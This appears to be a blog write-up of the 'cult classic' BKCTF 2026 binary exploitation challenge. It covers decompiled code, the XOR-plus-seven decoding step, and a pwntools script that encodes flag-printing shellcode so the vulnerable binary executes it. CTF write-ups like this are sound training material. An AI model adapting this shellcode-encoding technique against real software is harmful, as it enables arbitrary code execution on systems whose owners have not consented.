---
author: milrn
categories:
- CTF Writeups
- Binary Exploitation
- Easy
layout: post
media_subpath: /assets/posts/2026-03-15-cult-classic
tags:
- BKCTF 2026
- Shellcode
- Easy
title: cult classic
description: Cult classic was an Easy Binary Exploitation challenge from BKCTF 2026. It was the second most solved Binary Exploitation challenge.
---

Cult classic was an Easy Binary Exploitation challenge from BKCTF 2026. It was the second most solved Binary Exploitation challenge.

# Reversing

After putting the cult-classic binary into ghidra, and disassembling main, I got the following code:

```

/* WARNING: Unknown calling convention */

int main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  char sigils [128];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  puts("Draw ritual sigils");
  fgets(sigils,0x80,stdin);
  castSpell(sigils);
  puts("...Has the dark lord been awoken yet?");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The main function seems to call another function, castSpell(), so let's decompile that too:

```

void castSpell(char *ritual)

{
  long lVar1;
  long in_FS_OFFSET;
  char *ritual_local;
  uint8_t i;
  char decipheredSpell [128];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  for (i = '\0'; -1 < (char)i; i = i + '\x01') {
    decipheredSpell[(int)(uint)i] = (i ^ ritual[i]) + 7;
  }
  puts("Now casting...");
  (*(code *)decipheredSpell)();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

# Analysis

Due to this being a beginner challenge, the mechanism of code execution through this binary is clear. In the castSpell() function, the argument (ritual) that is passed in gets morphed into a decipheredSpell and then gets executed as code. NX was off on this challenge, so the first thing that came to mind was shellcode. Due to the large write that we have, shellcode golfing will not be neccesary. Since we control the argument that gets deciphered and then executed, we can assemble a shellcode payload with the right morphing, so that when it gets deciphered, it is valid shellcode that when executed, prints the flag.

# Decoding the Morphing

To make sure our shellcode is valid after the morphing, we simply have to apply the operations they applied to "decipher" in reverse order. So, for every byte of shellcode, we will subtract 7 and then XOR the result with a count variable that keeps track of how many bytes have been morphed so far. This will ensure that when our shellcode is "deciphered" that we get back our originally intended flag shellcode. This gives us the following solve script made with pwntools.

```
from pwn import *
context.clear(arch="amd64")
# tell pwntools what architecture to make shellcode for
payload = asm(shellcraft.cat("flag"))
# create shellcode that will cat out the flag file
elf = ELF("cult_classic")
p = process(elf.path)
payload = payload
morphed_payload = []
i = 0
for x in payload:
    morphed_payload.append((x-7)^i) # reverse the deciphering algorithm
    i += 1  # increment i for each byte processed
morphed_payload_bytes = bytes(morphed_payload)
p.sendline(morphed_payload_bytes)
p.interactive()
```

# Valid Byte Range

However, executing the above script returns an error:

```
┌──(kali㉿kali)-[~/BKCTF/cult-classic]                                                                                                                                                                                                                
└─$ python3 solve.py                                                                                                                                                                                                                         
[*] '/home/kali/BKCTF/cult-classic/cult_classic'                                                                                                                                                                                                      
    Arch:       amd64-64-little                                                                                                                                                                                                              
    RELRO:      Full RELRO                                                                                                                                                                                                                   
    Stack:      Canary found                                                                                                                                                                                                                 
    NX:         NX unknown - GNU_STACK missing                                                                                                                                                                                               
    PIE:        PIE enabled                                                                                                                                                                                                                  
    Stack:      Executable                                                                                                                                                                                                                   
    RWX:        Has RWX segments                                                                                                                                                                                                             
    SHSTK:      Enabled                                                                                                                                                                                                                      
    IBT:        Enabled                                                                                                                                                                                                                      
    Stripped:   No                                                                                                                                                                                                                           
    Debuginfo:  Yes                                                                                                                                                                                                                          
[+] Starting local process /home/kali/BKCTF/cult-classic/cult_classic': pid 507217                                                                                                                                                                   
Traceback (most recent call last):                                                                                                                                                                                                           
  File "/home/kali/BKCTF/cult-classic/solve.py", line 27, in <module>                                                                                                                                                                                 
    morphed_payload_bytes = bytes(morphed_payload)
ValueError: bytes must be in range(0, 256)
[*] Stopped process '/home/kali/BKCTF/cult-classic/cult_classic' (pid 507217)
```

Since we are morphing each byte, some are going out of the valid byte range of 0-256. 

How can this be accounted for?

In the deciphering algorithm, no matter what integer result the morphing returns, it's being added to a char array (chars are always 1 byte in size). This means that only the least significant 1 byte matters, and anything past 1 byte (or 256) does not influence the resulting deciphered shellcode. So knowing this, we can implement the same thing in our algorithm by wrapping around any overflow above 1 byte (or any negative numbers), and we won't lose any important information. This can be done with the modulus operator in python, which fixes all our invalid byte values.

# Exploit

```
from pwn import *
context.clear(arch="amd64")
# tell pwntools what architecture to make shellcode for
payload = asm(shellcraft.cat("flag"))
# create shellcode that will cat out the flag file
elf = ELF("cult_classic")
p = process(elf.path)
payload = payload
morphed_payload = []
i = 0
for x in payload:
    morphed_payload.append(((x-7)^i)%256) # reverse the deciphering algorithm
    i += 1 # increment i for each byte processed
print(morphed_payload)
morphed_payload_bytes = bytes(morphed_payload)
p.sendline(morphed_payload_bytes)
p.interactive()
```

Running this pwntools script will successfully print the flag file if it exists in the same directory as the challenge file.
